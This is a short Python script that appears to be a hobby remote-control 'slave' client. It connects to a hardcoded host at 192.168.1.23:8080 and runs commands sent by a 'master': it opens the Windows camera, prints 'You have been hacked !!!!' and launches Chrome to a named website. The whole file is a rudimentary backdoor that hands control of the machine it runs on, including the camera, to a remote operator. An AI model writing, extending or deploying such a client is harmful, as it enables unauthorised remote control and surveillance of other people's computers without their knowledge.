import time
import socket
import sys
import os

# Initialize s to socket
# Initialize the host
host = "192.168.1.23"

# Initiaze the port
port = 8080

# bind the socket with port and host


def tryToConnect():
    result = None
    try:
        s = socket.socket()
        s.connect((host, port))
    except:
        print("Oups no listener found")
        return 1
    print("Connected to Server.")

    # recieve the command from master program
    while True:
        data = s.recv(1024)
        if(len(data) == 0):
            print("You got disconnected !")
            return 1 
        command = data
        command = command.decode()
               
    # match the command and execute it on slave system
        if command == "camera":
            print("Command is :", command)
            # you can give batch file as input here
            os.system('color a')
            os.system('start microsoft.windows.camera:')
        if command == "virus":
            os.system('color a')
            print("You have been hacked !!!!")
        if command == "jimmy":
            os.system('start chrome http://www.jimmydoussain.fr/')
        

while True:
    if(tryToConnect()):
        tryToConnect()
    else:
        break
